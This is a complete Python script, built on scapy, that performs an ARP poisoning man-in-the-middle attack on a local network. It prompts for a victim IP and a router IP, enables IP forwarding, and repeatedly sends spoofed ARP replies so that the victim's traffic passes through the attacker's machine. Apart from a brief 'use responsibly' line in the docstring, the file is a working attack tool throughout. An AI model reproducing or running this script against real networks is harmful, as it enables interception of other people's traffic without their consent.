#!/usr/bin/env python3
"""
ARP Poisoning MITM Script

This script performs ARP poisoning to conduct a Man-in-the-Middle (MITM) attack on a local network.
It sends spoofed ARP responses to both the victim and the gateway (router) so that their traffic is
routed through the attacker's machine.

IMPORTANT:
    - This script requires root privileges to run.
    - It modifies IP forwarding settings on the system.
    - Use responsibly and only on networks you own or have explicit permission to test.

Usage:
    python3 <script_name.py>
    
The script will prompt for:
    - The network interface to use (e.g., eth0)
    - Victim's IP address
    - Gateway (router) IP address
"""

from scapy.all import *
import sys
import os
import time

# Request user input for the interface, victim IP, and gateway IP.
# In Python 3, use 'input()' instead of 'raw_input()'.
try:
    interface = input("[*] Enter Desired Interface: ")
    victimIP = input("[*] Enter Victim IP: ")
    gateIP = input("[*] Enter Router IP: ")
except KeyboardInterrupt:
    # Handle interruption (e.g., user pressing Ctrl+C) gracefully.
    print("\n[*] User Requested Shutdown")
    print("[*] Exiting...")
    sys.exit(1)

# Enable IP forwarding to allow the attacker's machine to forward traffic.
print("\n[*] Enabling IP Forwarding...\n")
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

def get_mac(IP):
    """
    Retrieves the MAC address for a given IP address via an ARP request.

    Parameters:
        IP (str): The target IP address for which the MAC address is requested.

    Returns:
        str: The MAC address of the target IP if found.
    """
    # Disable verbose output from scapy.
    conf.verb = 0
    # Send an ARP request to the broadcast MAC address for the specified IP.
    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=IP),
                      timeout=2, iface=interface, inter=0.1)
    for snd, rcv in ans:
        # Return the source MAC address from the received ARP reply.
        return rcv.sprintf(r"%Ether.src%")

def reARP():
    """
    Restores the original ARP configuration on the network.

    This function is called when the attack is interrupted. It sends ARP packets to both
    the victim and the gateway to restore their correct MAC-IP mappings, disables IP forwarding,
    and exits the script.
    """
    print("\n[*] Restoring Targets...")
    # Retrieve the actual MAC addresses for the victim and the gateway.
    victimMAC = get_mac(victimIP)
    gateMAC = get_mac(gateIP)
    # Send ARP responses to restore the correct MAC addresses on both targets.
    send(ARP(op=2, pdst=gateIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMAC), count=7)
    send(ARP(op=2, pdst=victimIP, psrc=gateIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateMAC), count=7)
    print("[*] Disabling IP Forwarding...")
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    print("[*] Shutting Down...")
    sys.exit(1)

def trick(gm, vm):
    """
    Performs the ARP poisoning by sending spoofed ARP responses to both the victim and the gateway.

    Parameters:
        gm (str): Gateway's MAC address.
        vm (str): Victim's MAC address.
    """
    # Spoof the victim: tell the victim that the gateway IP is at the attacker's MAC.
    send(ARP(op=2, pdst=victimIP, psrc=gateIP, hwdst=vm))
    # Spoof the gateway: tell the gateway that the victim IP is at the attacker's MAC.
    send(ARP(op=2, pdst=gateIP, psrc=victimIP, hwdst=gm))

def mitm():
    """
    Main function to perform the ARP poisoning MITM attack.

    It first attempts to obtain the MAC addresses of both the victim and the gateway. If it fails to
    retrieve either, it disables IP forwarding and exits. Once both MAC addresses are acquired, it enters
    an infinite loop to continuously send spoofed ARP responses. If interrupted, it calls reARP() to restore
    the network.
    """
    try:
        victimMAC = get_mac(victimIP)
    except Exception:
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        print("[!] Couldn't Find Victim MAC Address")
        print("[!] Exiting...")
        sys.exit(1)
    
    try:
        gateMAC = get_mac(gateIP)
    except Exception:
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        print("[!] Couldn't Find Gateway MAC Address")
        print("[!] Exiting...")
        sys.exit(1)

    print("[*] Poisoning Targets...")
    # Continuously send spoofed ARP packets every 1.5 seconds.
    while True:
        try:
            trick(gateMAC, victimMAC)
            time.sleep(1.5)
        except KeyboardInterrupt:
            # On interruption, restore the network configuration.
            reARP()
            break

if __name__ == '__main__':
    mitm()
